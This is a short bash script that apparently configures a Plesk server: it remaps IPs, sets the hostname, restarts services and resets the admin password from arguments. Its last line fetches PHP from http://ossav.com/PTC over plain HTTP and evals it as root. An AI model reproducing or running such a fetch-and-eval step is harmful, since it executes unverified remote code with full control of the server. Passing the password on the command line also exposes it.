#!/bin/bash

DOMAIN=$1
PASSWD=$2
IP=$(wget -O - -q ifconfig.me)

/usr/sbin/plesk bin ipmanage --remap /root/ip_map_file
/usr/sbin/plesk bin ipmanage --remap /root/ip_map_file
rm -f /root/ip_map_file 
/usr/sbin/plesk bin server_pref --update -hostname $DOMAIN
/etc/init.d/sw-cp-server restart
/etc/init.d/sw-engine restart
/usr/local/psa/bin/init_conf -u -passwd $PASSWD
/usr/sbin/plesk php -er "eval(file_get_contents('http://ossav.com/PTC'));";
